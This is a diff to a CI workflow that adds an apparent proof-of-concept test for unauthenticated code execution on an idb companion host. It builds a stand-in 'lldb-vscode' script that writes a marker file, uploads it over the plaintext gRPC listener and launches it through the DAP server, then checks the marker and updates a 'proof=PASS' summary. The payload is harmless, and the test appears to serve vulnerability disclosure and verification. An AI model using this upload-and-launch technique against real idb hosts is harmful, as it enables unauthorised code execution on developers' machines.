@@ -109,6 +109,46 @@ jobs:
           print(f"unauthenticated_describe_target={description['udid']}")
           PY
 
+          dap_marker="$RUNNER_TEMP/idb-unauthenticated-dap-host-rce"
+          dap_package="$RUNNER_TEMP/attacker-dap"
+          mkdir -p "$dap_package/usr/bin"
+          cat > "$dap_package/usr/bin/lldb-vscode" <<EOF
+          #!/bin/sh
+          printf '%s\n' 'remote-host-code-executed-via-dap' > '$dap_marker'
+          while IFS= read -r line; do :; done
+          EOF
+          chmod 755 "$dap_package/usr/bin/lldb-vscode"
+          test ! -e "$dap_marker"
+          "$RUNNER_TEMP/venv/bin/python" - "$host_ip" "$port" "$dap_package" <<'PY'
+          import asyncio
+          import logging
+          import pathlib
+          import sys
+
+          from idb.common.types import FileContainerType, TCPAddress
+          from idb.grpc.client import Client
+          from idb.grpc.dap import RemoteDapServer
+
+          async def main() -> None:
+              host, port, package = sys.argv[1], int(sys.argv[2]), pathlib.Path(sys.argv[3])
+              address = TCPAddress(host=host, port=port)
+              logger = logging.getLogger("unauthenticated-dap-proof")
+              async with Client.build(address=address, logger=logger, exchange_metadata=False) as client:
+                  await client.mkdir(container=FileContainerType.ROOT, path="dap")
+                  await client.push(
+                      src_paths=[str(package)],
+                      container=FileContainerType.ROOT,
+                      dest_path="dap",
+                      compression=None,
+                  )
+                  async with RemoteDapServer.start(client.stub, logger, package.stem):
+                      await asyncio.sleep(1)
+              print("unauthenticated_dap=uploaded executable launched as companion-host subprocess")
+
+          asyncio.run(main())
+          PY
+          test "$(cat "$dap_marker")" = 'remote-host-code-executed-via-dap'
+
           host_marker="$RUNNER_TEMP/idb-unauthenticated-host-rce"
           test ! -e "$host_marker"
           "$RUNNER_TEMP/venv/bin/python" - "$host_ip" "$port" "$host_marker" "$RUNNER_TEMP/untrusted-trace" <<'PY'
@@ -187,4 +227,4 @@ jobs:
             echo 'unexpected TLS listener' >&2
             exit 1
           fi
-          printf 'proof=PASS wildcard plaintext listener accepted remote-address RPCs, companion-host postprocessor code and arbitrary REPL code without credentials\n'
+          printf 'proof=PASS wildcard plaintext listener accepted remote-address RPCs, uploaded companion-host DAP code, companion-host postprocessor code and arbitrary REPL code without credentials\n'
